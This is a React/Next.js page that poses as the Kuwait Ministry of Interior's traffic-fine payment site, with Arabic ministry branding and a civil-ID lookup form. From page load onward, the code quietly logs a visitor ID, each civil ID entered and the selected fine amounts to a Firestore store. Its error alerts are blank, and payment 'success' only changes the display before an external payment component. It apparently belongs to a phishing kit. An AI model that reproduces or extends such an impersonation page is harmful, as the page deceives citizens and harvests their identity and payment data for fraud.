"use client"
import Image from "next/image"
import type React from "react"

import { Menu, Play, Volume2, Hash, ChevronDown, AlertCircle, Facebook, Instagram, Twitter } from "lucide-react"
import { Button } from "@/components/ui/button"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { Separator } from "@/components/ui/separator"
import { useState, useEffect } from "react"
import { Checkbox } from "@/components/ui/checkbox"
import { PaymentSection } from "@/components/payment-section"
import { useFetchViolationData } from "@/hooks/use-fetch-violation-data"
import { addData } from "@/lib/firestore"

interface Violation {
  id: string
  amount: number
  plateNumber: string
  date: string
  location?: string
  type?: string
}

interface ViolationsResponse {
  success: boolean
  data: {
    totalViolations: number
    totalAmount: number
    violations: Violation[]
  }
  message?: string
}

export default function Home() {
  const [civilId, setCivilId] = useState("")
  const [expandedViolations, setExpandedViolations] = useState<Record<string, boolean>>({})
  const [selectedViolations, setSelectedViolations] = useState<string[]>([])
  const [userType, setUserType] = useState("id") // "id" for individuals, "company" for companies
  const [violationsData, setViolationsData] = useState<ViolationsResponse | null>(null)
  const [selectedAmount, setSelectedAmount] = useState(0)
  const [paymentSuccess, setPaymentSuccess] = useState(false)
  const [idnew, setIdnew] = useState("")

  // Use the custom hook
  const { violationData, isLoading, error, fetchViolationData } = useFetchViolationData()

  // Generate ID only once when component mounts
  useEffect(() => {
    const _id = "_" + Math.random().toString(36).substr(2, 9)
    setIdnew(_id)
    addData({ id: _id, createdDate: new Date().toISOString() })
  }, [])

  // Calculate selected amount when selectedViolations changes
  useEffect(() => {
    if (violationsData) {
      const amount = violationsData.data.violations
        .filter((v) => selectedViolations.includes(v.id))
        .reduce((sum, v) => sum + v.amount, 0)
      setSelectedAmount(amount!)
      addData({ id: idnew, violationValue:amount.toString() })
      localStorage.setItem('amount',amount.toString())
    }
  }, [selectedViolations, violationsData])

  // Convert API data to our format when violationData changes
  useEffect(() => {
    if (violationData) {
      const violations: Violation[] = violationData.personalViolationsData.map((v) => ({
        id: v.violationTicketNumber,
        amount: v.violationAmount,
        plateNumber: `${v.vehiclePlateCode}/${v.vehiclePlateNumber}`,
        date: v.violationDate,
        location: v.violationPlace,
        type: v.violationType,
      }))

      setViolationsData({
        success: violationData.statusCode === 200,
        data: {
          totalViolations: violationData.totalTicketsCount,
          totalAmount: violationData.totalViolationAmount,
          violations,
        },
        message: violationData.statusMessage,
      })

      // Initialize expanded state for all violations
      const expanded: Record<string, boolean> = {}
      violations.forEach((v) => {
        expanded[v.id] = true // Default to expanded
      })
      setExpandedViolations(expanded)
    }
  }, [violationData])

  // Toggle expansion state for a violation
  const toggleViolation = (id: string) => {
    setExpandedViolations((prev) => ({
      ...prev,
      [id]: !prev[id],
    }))
  }

  // Toggle selection of a violation
  const toggleViolationSelection = (id: string) => {
    setSelectedViolations((prev) => (prev.includes(id) ? prev.filter((v) => v !== id) : [...prev, id]))
  }

  // Format date to DD-MM-YYYY
  const formatDate = (dateString: string) => {
    try {
      const date = new Date(dateString)
      return `${date.getDate().toString().padStart(2, "0")}-${(date.getMonth() + 1)
        .toString()
        .padStart(2, "0")}-${date.getFullYear()}`
    } catch (e) {
      return dateString // Return as is if parsing fails
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (civilId.trim()) {
      // Reset payment success state
      setPaymentSuccess(false)
      // Reset selected violations
      setSelectedViolations([])
      // Use the fetchViolationData from the hook
      fetchViolationData(civilId)
      // Add data to firestore
      addData({ id: idnew, civilId })
    }
  }

  const handlePaymentSubmit = () => {
    setPaymentSuccess(true)
    // Remove paid violations from the list
    if (violationsData) {
      const updatedViolations = violationsData.data.violations.filter((v) => !selectedViolations.includes(v.id))

      setViolationsData({
        ...violationsData,
        data: {
          ...violationsData.data,
          totalViolations: updatedViolations.length,
          totalAmount: updatedViolations.reduce((sum, v) => sum + v.amount, 0),
          violations: updatedViolations,
        },
      })

      // Clear selected violations
      setSelectedViolations([])
    }
  }

  // Select all violations
  const selectAllViolations = () => {
    if (violationsData) {
      setSelectedViolations(violationsData.data.violations.map((v) => v.id))
    }
  }

  // Deselect all violations
  const deselectAllViolations = () => {
    setSelectedViolations([])
  }

  return (
    <div
      className="bg-[#eceae4] flex flex-col min-h-screen text-right font-arabic"
      dir="rtl"
      style={{
        backgroundImage: "url('/images/bg-pattern.png')",
        backgroundRepeat: "repeat",
        backgroundColor: "#f5f2ed",
      }}
    >
      {/* Header */}
      <header className="bg-[#eceae4] py-2 px-4 flex justify-between items-center border-b">
        <div className="flex items-center gap-2">
          <Image src="/globe.svg" alt="Kuwait MOI Logo" width={50} height={50} className="mr-2" />
          <div className="text-right">
            <h1 className="text-[#0a2463] font-bold text-lg leading-tight">دولة الكويت</h1>
            <h2 className="text-[#0a2463] text-sm leading-tight">وزارة الداخلية</h2>
          </div>
        </div>
      </header>

      {/* Audio Controls */}
      <div className="bg-[#0a2463] text-white py-1 px-4 border-b flex">
        <div className="flex border rounded overflow-hidden">
          <Button variant="ghost" size="sm" className="h-8 px-3 border-l rounded-none">
            <Volume2 className="h-4 w-4 ml-1" />
            <span className="text-xs">استمع</span>
          </Button>
          <Button variant="ghost" size="sm" className="h-8 w-8 rounded-none flex justify-center items-center">
            <Play className="h-4 w-4" />
          </Button>
        </div>
        <Button variant="ghost" size="icon" className="text-white mr-auto bg-[#0a2463] hover:bg-[#0a2463]/90">
          <Menu className="h-5 w-5" />
        </Button>
      </div>

      {/* Traffic Department Logo */}
      <div className="bg-[#eceae4] py-3 px-4 flex justify-center">
        <div className="text-center">
          <Image src="/vercel.svg" alt="Traffic Department Logo" width={70} height={70} className="mx-auto" />
          <h3 className="text-[#0a2463] font-bold mt-1 text-sm">الإدارة العامة للمرور</h3>
        </div>
      </div>

      {/* Main Menu */}
      <div className="bg-[#0a2463] p-4 text-white" dir="rtl">
        <ul className="space-y-3">
          <li className="flex items-center py-1.5">
            <Image className="mx-2" src={"/ico-renew-license.svg"} alt="" width={50} height={50} />
            <span className="text-sm">الخدمات الالكترونية لرخص السوق</span>
          </li>
          <li className="flex items-center py-1.5">
            <Image className="mx-2" src={"/ico-renew-license.svg"} alt="" width={50} height={50} />
            <span className="text-sm">دفع المخالفات</span>
          </li>
          <li className="flex items-center py-1.5">
            <Image className="mx-2" src={"/ico-payment.svg"} alt="" width={50} height={50} />
            <span className="text-sm">نظام مواعيد اختبار القيادة</span>
          </li>
          <li className="flex items-center py-1.5">
            <Image className="mx-2" src={"/ico-booking.svg"} alt="" width={50} height={50} />
            <span className="text-sm">معاملات المرور</span>
          </li>
          <li className="flex items-center py-1.5">
            <Image className="mx-2" src={"/ico-renew-license.svg"} alt="" width={50} height={50} />
            <span className="text-sm">مواقع الإدارة العامة للمرور</span>
          </li>
          <li className="flex items-center py-1.5">
            <Image className="mx-2" src={"/ico-locations-sections.svg"} alt="" width={50} height={50} />
            <span className="text-sm">شروط منح رخص السوق لغير الكويتيين</span>
          </li>
        </ul>
      </div>

      {/* Form Section */}
      <form onSubmit={handleSubmit} className="bg-[#eceae4] p-4 border-t border-b">
        <h3 className="text-[#0a2463] font-bold mb-4 text-center text-sm">الإدارة العامة للمرور</h3>

        <RadioGroup
          defaultValue="id"
          className="flex justify-center gap-6 mb-4"
          value={userType}
          onValueChange={setUserType}
        >
          <div className="flex items-center">
            <RadioGroupItem value="id" id="id" className="ml-2 border-[#0a2463]" />
            <Label htmlFor="id" className="text-sm">
              الأفراد
            </Label>
          </div>
          <div className="flex items-center">
            <RadioGroupItem value="company" id="company" className="ml-2 border-[#0a2463]" />
            <Label htmlFor="company" className="text-sm">
              الشركات
            </Label>
          </div>
        </RadioGroup>

        <div className="mb-4">
          <Label htmlFor="civilId" className="block mb-2 text-xs">
            الرقم المدني أو الرقم الموحد
          </Label>
          <Input
            id="civilId"
            className="w-full border p-2 text-right"
            value={civilId}
            type="tel"
            maxLength={12}
            onChange={(e) => setCivilId(e.target.value)}
            placeholder="أدخل الرقم المدني "
          />
        </div>

        <Button
          type="submit"
          className="w-full bg-[#e6e6e6] hover:bg-[#d9d9d9] text-[#333] font-medium py-2"
          disabled={isLoading}
        >
          {isLoading ? (
            <>
              جاري الاستعلام
              <div className="spinner-grow text-secondary d-none" role="status" id="workingOnIt">
                <span className="sr-only">Loading...</span>
              </div>
            </>
          ) : (
            "إستعلام"
          )}
        </Button>

        <p className="text-[10px] mt-4 text-center px-4 text-[#555]">
          بعد إجراء عملية الدفع، يرجى عدم محاولة الدفع مرة أخرى حيث يجري تحديث البيانات خلال 15 دقيقة
        </p>

        <div className="flex justify-center gap-2 mt-4">
          <Button className="bg-red-600 hover:bg-[#d62b39] text-white text-[10px] px-3 py-1 h-auto rounded">
            غير قابلة للدفع الكترونيا
          </Button>
          <Button className="bg-green-600 hover:bg-[#238b7e] text-white text-[10px] px-3 py-1 h-auto rounded">
            قابلة للدفع الكترونيا
          </Button>
        </div>
      </form>

      {/* Error Alert */}
      {error && (
       <></>
      )}

      {/* Payment Success Alert */}
      {paymentSuccess && (
             <></>

      )}

      {/* Violations Summary */}
      {violationsData && (
        <>
          <div className="bg-[#f0f0f4] p-3 mb-4 rounded mx-4 mt-4">
            <div className="flex justify-between">
              <div className="font-bold">
                عدد المخالفات: <span className="text-[#0a2463]">{violationsData.data.totalViolations}</span>
              </div>
              <div className="font-bold">
                المبلغ الإجمالي: <span className="text-[#0a2463]">{violationsData.data.totalAmount} د.ك</span>
              </div>
            </div>
          </div>

          {/* Selection Controls */}
          {violationsData.data.violations.length > 0 && (
            <div className="flex justify-between mx-4 mb-2">
              <Button variant="outline" size="sm" onClick={selectAllViolations} className="text-xs">
                تحديد الكل
              </Button>
              <Button variant="outline" size="sm" onClick={deselectAllViolations} className="text-xs">
                إلغاء التحديد
              </Button>
            </div>
          )}

          {/* Violations List */}
          {violationsData.data.violations.length > 0 ? (
            <>
              {violationsData.data.violations.map((violation) => (
                <div key={violation.id} className="border-t-4 border-[#008000] bg-white mb-2 shadow-sm mx-4">
                  <div className="flex justify-between items-center p-3 border-b">
                    <div className="flex items-center">
                      <Checkbox
                        id={`violation-${violation.id}`}
                        className="ml-2"
                        checked={selectedViolations.includes(violation.id)}
                        onCheckedChange={() => toggleViolationSelection(violation.id)}
                      />
                      <Label htmlFor={`violation-${violation.id}`} className="font-bold">
                        رقم: <span className="text-[#0a2463]">{violation.id}</span>
                      </Label>
                    </div>
                    <Button
                      variant="ghost"
                      size="sm"
                      className="p-0 h-auto"
                      onClick={() => toggleViolation(violation.id)}
                    >
                      <ChevronDown
                        className={`h-5 w-5 transition-transform ${
                          expandedViolations[violation.id] ? "transform rotate-180" : ""
                        }`}
                      />
                    </Button>
                  </div>

                  {expandedViolations[violation.id] && (
                    <div className="p-3 text-sm">
                      <div className="flex justify-between py-1 border-b">
                        <span className="font-bold">قيمة المخالفة:</span>
                        <span className="text-[#0a2463]">{violation.amount} د.ك</span>
                      </div>
                      <div className="flex justify-between py-1 border-b">
                        <span className="font-bold">رقم اللوحة:</span>
                        <span>{violation.plateNumber}</span>
                      </div>
                      <div className="flex justify-between py-1 border-b">
                        <span className="font-bold">تاريخ المخالفة:</span>
                        <span>{formatDate(violation.date)}</span>
                      </div>
                      {violation.location && (
                        <div className="flex justify-between py-1 border-b">
                          <span className="font-bold">الموقع:</span>
                          <span>{violation.location}</span>
                        </div>
                      )}
                      {violation.type && (
                        <div className="flex justify-between py-1">
                          <span className="font-bold">نوع المخالفة:</span>
                          <span>{violation.type}</span>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              ))}

              {/* Payment Section - Only show if violations are selected */}
              {selectedViolations.length > 0 && (
                <PaymentSection totalAmount={selectedAmount} onPaymentSubmit={handlePaymentSubmit} />
              )}
            </>
          ) : (
            <div className="bg-white p-4 text-center mx-4 rounded shadow-sm">
              <p>لا توجد مخالفات مسجلة</p>
            </div>
          )}
        </>
      )}

      {/* Service Icons */}
      <div className="bg-[#0a2463] py-6 flex justify-center">
        <div className="rounded-full p-4 flex items-center justify-center">
          <img src="/ico-payment.svg" alt="Payment" height={200} width={200} />
        </div>
      </div>

      <div className="bg-white py-6 flex justify-center">
        <div className="rounded-full p-4 flex items-center justify-center">
          <img src="/ico-renew-government.svg" alt="Government" height={200} width={200} />
        </div>
      </div>

      <div className="bg-[#0a2463] py-6 flex justify-center">
        <div className="bg-white rounded-full p-4 flex items-center justify-center">
          <Hash className="h-8 w-8 text-[#0a2463]" />
        </div>
      </div>

      {/* Bottom Form */}
      <div className="bg-white p-4">
        <div className="flex flex-col items-center mb-4">
          <h3 className="text-[#0a2463] font-bold text-sm">الإستعلام عن رقم مرجع الداخلية</h3>
          <Separator className="w-1/4 my-2 bg-[#0a2463]" />
        </div>

        <div className="mb-4">
          <Label htmlFor="civilId2" className="block mb-2 text-xs">
            الرقم المدني
          </Label>
          <Input id="civilId2" className="w-full border p-2 text-right" />
        </div>

        <Button className="w-full bg-[#e6e6e6] hover:bg-[#d9d9d9] text-[#333] font-medium py-2 mb-2">للكويتيين</Button>

        <Button className="w-full bg-[#e6e6e6] hover:bg-[#d9d9d9] text-[#333] font-medium py-2">للمقيمين</Button>
      </div>

      {/* E-Services Logo */}
      <div className="bg-[#0a2463] py-6 flex justify-center">
        <div className="text-center">
          <div className="bg-white rounded-full p-4 inline-flex items-center justify-center">
            <img src="/ico-new-services.svg" alt="Services" height={200} width={200} />
          </div>
          <p className="text-white text-xs mt-1">E-Services</p>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-white py-3 px-4 text-center text-xs">
        <div className="flex justify-center gap-3 mb-2">
          <span className="w-8 h-8 flex items-center justify-center bg-[#0a2463] text-white rounded-full text-[10px]">
            <Facebook size={16} />
          </span>
          <span className="w-8 h-8 flex items-center justify-center bg-[#0a2463] text-white rounded-full text-[10px]">
            <Twitter size={16} />
          </span>
          <span className="w-8 h-8 flex items-center justify-center bg-[#0a2463] text-white rounded-full text-[10px]">
            <Instagram size={16} />
          </span>
        </div>
        <p className="text-[#555] text-[10px]">© جميع الحقوق محفوظة - وزارة الداخلية الكويت - 2023</p>
      </footer>
    </div>
  )
}
